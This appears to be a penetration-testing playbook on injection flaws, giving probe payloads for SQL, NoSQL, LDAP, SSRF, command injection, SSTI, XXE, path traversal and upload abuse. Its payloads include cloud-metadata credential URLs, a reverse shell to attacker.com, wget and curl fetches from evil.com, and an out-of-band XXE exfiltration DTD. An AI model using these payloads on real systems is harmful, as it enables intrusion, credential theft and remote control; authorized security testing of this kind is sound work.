# Playbook 08 — Injection

**Goal:** find every place where user input becomes code, query,
command, path, or URL that the server interprets — and confirm the
input can change interpretation.

Covers: SQL, NoSQL, LDAP, OS command, SSTI, XXE, expression-language,
SSRF, file-path / LFI, header injection, GraphQL, prototype pollution
on the server side.

XSS is a *client-side* injection — see playbook 09.

---

## 8.1 SQL injection

Most modern frameworks use parameterized queries via ORM, but legacy
endpoints, custom report queries, search, and admin tooling routinely
skip the ORM.

### 8.1.1 Manual probing

```bash
# Original
curl -sk "https://<target>/services?cat=1" -b "$COOKIE" -o orig.html

# Quote
curl -sk "https://<target>/services?cat=1'" -b "$COOKIE" -o quote.html

# Double quote
curl -sk 'https://<target>/services?cat=1"' -b "$COOKIE" -o dquote.html

# Boolean
curl -sk "https://<target>/services?cat=1+AND+1=1" -b "$COOKIE" -o true.html
curl -sk "https://<target>/services?cat=1+AND+1=2" -b "$COOKIE" -o false.html

# Time
curl -sk -w "%{time_total}\n" -o /dev/null \
  "https://<target>/services?cat=1;SELECT+pg_sleep(5)--"
```

Signals:
- Quote causes 500 → SQL error path. Read response for info disclosure.
- `AND 1=1` matches original, `AND 1=2` differs → boolean-based.
- Time-based: response delays match injected sleep.
- UNION-based if column count guessable: `1' UNION SELECT 1,2,3--`.

### 8.1.2 Targets

- Search / filter parameters (`q`, `search`, `filter`).
- Sort / order_by — often concatenated into `ORDER BY` directly.
- Custom report endpoints, admin reports, CSV exports.
- Legacy endpoints (`v1` versions of `v2`).
- Login forms (still seen).
- HTTP headers used in DB queries (`User-Agent`, `Referer`, custom).

### 8.1.3 sqlmap (carefully)

Once you have a candidate, scope sqlmap to one parameter with
conservative settings:

```bash
sqlmap -u "https://<target>/services?cat=1" \
  --cookie="$COOKIE" \
  --level=2 --risk=1 --batch --random-agent \
  -p cat --threads=2 --delay=0.3 \
  --output-dir=evidence/sqli/
```

Never `--risk=3 --level=5` against production — destructive payloads
and high concurrency.

### 8.1.4 Second-order SQLi

User input stored in DB without sanitization, later used in another
query unparameterized. Test by:
- Storing a test value with SQL syntax in a field.
- Triggering the action that re-uses the value (e.g. profile
  display, admin search).
- Looking for delayed signal.

---

## 8.2 NoSQL injection

For MongoDB, Couch, etc.:

```javascript
// Login bypass — JSON body
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$gt": ""}}

// Operator injection
{"username": "admin", "password": {"$regex": "^a"}}  // first letter brute force
```

For Redis (used as data store):
- CRLF injection in commands if user input becomes Redis args
  unsanitized.

---

## 8.3 LDAP injection

For apps using LDAP for auth/lookup:

```text
# In username field
*)(uid=*))(|(uid=*
admin))(|(password=*
```

Common in enterprise auth integrations. Check error responses for
LDAP server messages.

---

## 8.4 SSRF (Server-Side Request Forgery)

Apps fetch user-supplied URLs in many places:

- Avatar URL.
- Logo URL (child panel, branding).
- Webhook test endpoint ("send test webhook to...").
- "Import from URL" features.
- Drip-feed schedule URL.
- RSS feed.
- PDF rendering of external page.
- Screenshot / preview generation.
- OAuth redirect targets (carefully — see playbook 19).

For each URL field, test:

```text
http://127.0.0.1/
http://127.0.0.1:6379/                 # Redis
http://localhost:3306/                 # MySQL
http://[::1]/                          # IPv6 localhost
http://169.254.169.254/latest/meta-data/   # AWS metadata
http://169.254.169.254/computeMetadata/v1/  # GCP metadata
http://metadata.google.internal/       # GCP
http://0.0.0.0/
http://0/                              # short-form 0 = 0.0.0.0
http://127.1/                          # short notation
http://2130706433/                     # decimal IP for 127.0.0.1
http://017700000001/                   # octal
http://0x7f000001/                     # hex
http://127.0.0.1.nip.io/               # DNS rebinding setup
file:///etc/passwd
gopher://127.0.0.1:6379/_INFO          # Redis via gopher (RCE potential)
gopher://127.0.0.1:25/_HELO            # SMTP
dict://127.0.0.1:11211/stats           # Memcached via dict
ldap://127.0.0.1/
```

Detect:
- Point at server you control (Burp Collaborator, your DNS server,
  webhook.site) and watch for request.
- Compare response: error vs timeout vs content (different = SSRF
  fired).
- Time-based: long delays for unreachable internal hosts confirm
  the request happened.

### 8.4.1 SSRF + cloud metadata

If SSRF reaches metadata service:
- AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
  → IAM role credentials → cloud takeover.
- GCP: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`
  (requires `Metadata-Flavor: Google` header).
- Azure: `http://169.254.169.254/metadata/instance` (requires
  `Metadata: true`).

Critical. Surface immediately. Operator must rotate any potentially-
exposed credentials.

### 8.4.2 SSRF bypass tricks

When direct IP blocked:
- DNS rebinding: own domain that resolves to `127.0.0.1` after
  initial DNS check.
- Redirect chains: send URL pointing to your server, return 302
  to internal target.
- URL parsing inconsistencies: `http://allowed.com@127.0.0.1/`,
  `http://127.0.0.1#allowed.com`.
- Encoded IPs: octal, hex, decimal, dotless.
- Punycode and IDN homograph in hostname.
- IPv6 mapped IPv4: `[::ffff:127.0.0.1]`.

---

## 8.5 OS command injection

Server shells out for image processing, PDF generation, video
conversion, format changes, archive handling, etc.

Probe filename, URL, and other text that might enter a shell command:

```text
test`id`.jpg
test;id.jpg
test|id.jpg
test$(id).jpg
test;sleep 5;.jpg
test$(curl evil.com).jpg
test`ping -c 3 attacker.com`.jpg
test;wget evil.com/x;.jpg
test|bash -i >& /dev/tcp/attacker.com/4444 0>&1|
```

Detection:
- Sleep markers via response timing.
- Out-of-band: Burp Collaborator / your server.
- File creation if you can list uploads.

---

## 8.6 SSTI (Server-Side Template Injection)

If user-controlled content is rendered through a template engine
(custom email templates, branding pages, support reply templates,
custom invoices):

| Engine | Probe | Confirm |
|--------|-------|---------|
| Twig / Jinja | `{{7*7}}` | returns `49` |
| Smarty | `{$smarty.version}` | returns Smarty version |
| Velocity (Java) | `#set($x=7*7)$x` | returns `49` |
| Freemarker | `${7*7}` | returns `49` |
| ERB (Ruby) | `<%= 7*7 %>` | returns `49` |
| Pug / Jade | `#{7*7}` | returns `49` |
| Mustache / Handlebars | `{{#with "s" as |x|}}{{x.constructor.constructor "alert(1)"}}{{/with}}` | varies |
| AngularJS | `{{constructor.constructor('alert(1)')()}}` | sandbox escape |
| ASP.NET | `<%= 7*7 %>` or `${7*7}` | varies |

Confirmed SSTI in PHP/Twig, Python/Jinja, Ruby/ERB, Java/Velocity is
RCE in most configurations.

`tplmap` automates SSTI exploitation but use carefully.

---

## 8.7 XXE / XML

Apps that accept XML (less common now, but seen in SOAP integrations,
SAML, file uploads of `.xlsx` / `.docx` / `.svg`):

```xml
<!DOCTYPE r [
  <!ENTITY x SYSTEM "file:///etc/passwd">
]>
<root>&x;</root>
```

Out-of-band XXE for blind cases:

```xml
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "http://attacker.com/x.dtd">
  %remote;
]>
```

`x.dtd` on attacker server contains parameter entity that exfils.

XXE in `.svg` upload is real and often missed (some sites accept
SVG as image without parsing).

---

## 8.8 File path / LFI / path traversal

For any param that becomes a filesystem path:

```text
../../../etc/passwd
....//....//....//etc/passwd        # filter-bypass on `../` removed
..%2f..%2f..%2fetc/passwd           # URL encode
..%252f..%252f..%252fetc/passwd     # double encode
%c0%ae%c0%ae/                       # over-long UTF-8 (rare now)
/etc/passwd%00                      # null byte (legacy PHP)
/etc/passwd?
file:///etc/passwd
```

Targets:
- Download / view file endpoints (`?file=`, `?path=`, `?doc=`).
- Avatar / profile picture display from path-like param.
- "Include" features, language selectors.

In Java apps: check for `WEB-INF/web.xml` access.
In PHP apps: `php://filter/convert.base64-encode/resource=index.php`
to read source.

---

## 8.9 Header injection

CRLF in user input that becomes response headers:

```bash
curl -sk -H "X-Foo: bar%0d%0aSet-Cookie: pwned=1" "https://<target>/"
```

Look for:
- Set-Cookie injection (session fixation).
- Cache header injection (cache poisoning).
- HTTP/0.9 response splitting (legacy).
- Email header injection in forms that send emails (BCC injection,
  arbitrary recipients).

---

## 8.10 GraphQL injection

Beyond GraphQL-specific concerns (playbook 05 §5.12), GraphQL fields
can pass user input into resolvers that build queries:

- SQL injection via GraphQL field arguments.
- NoSQL injection same.
- Operation name injection.
- Variable type confusion.

---

## 8.11 Server-side prototype pollution

Node.js apps that use libraries with `assign`/`merge`/`extend`
without prototype protection:

```bash
curl -sk -X POST "https://<target>/api/something" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'

curl -sk -X POST "https://<target>/api/something" \
  -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"polluted":"yes"}}}'
```

Test by polluting then making another request that should be
unauthorized — if it succeeds, prototype pollution affected auth.

---

## 8.12 File upload abuse

Upload paths to test for code execution / XSS / path traversal:

| Test | Expected |
|------|---------|
| `shell.php` directly | rejected |
| `shell.php.jpg` | rejected (or stored but not executed) |
| `shell.jpg.php` | rejected |
| `shell.phtml/.php5/.phar/.pht/.phps` | rejected |
| `shell.aspx/.asp/.ashx/.asmx/.config` (IIS) | rejected |
| `shell.jsp/.jspx/.war` (Java) | rejected |
| `.htaccess` (overrides Apache config) | rejected |
| `web.config` (IIS overrides) | rejected |
| SVG with `<script>` | not rendered as HTML |
| PNG with PHP in metadata / EXIF | not exec |
| Polyglot (GIF89a + PHP) | not exec |
| ZIP with `../../shell.php` (zip-slip) | path-checked |
| Filename `../../../shell.jpg` | rejected |
| Filename `<svg onload=alert()>.jpg` | escaped on display |
| Null byte `shell.php%00.jpg` (legacy) | rejected |
| Content-Type swap (PHP file with `Content-Type: image/jpeg`) | rejected based on real content |
| Huge file (10GB) | rejected at limit |

Confirm any upload is stored:
- Outside webroot, OR
- Under webroot but not executable as PHP / JSP / ASP, OR
- Served via download script with auth checks.

Best: Imagick/GD re-encode to strip payloads (but check for ImageMagick
CVEs in your version).

---

## 8.13 Output

Per-finding in `findings/`. Phase summary:

- SQLi findings + endpoints.
- NoSQLi / LDAPi / cmd-injection findings.
- SSRF reachability (localhost / metadata / external).
- File upload bypass success/failure per attack type.
- SSTI / XXE / RCE findings.
- Open redirect surfaces.
- Header injection findings.
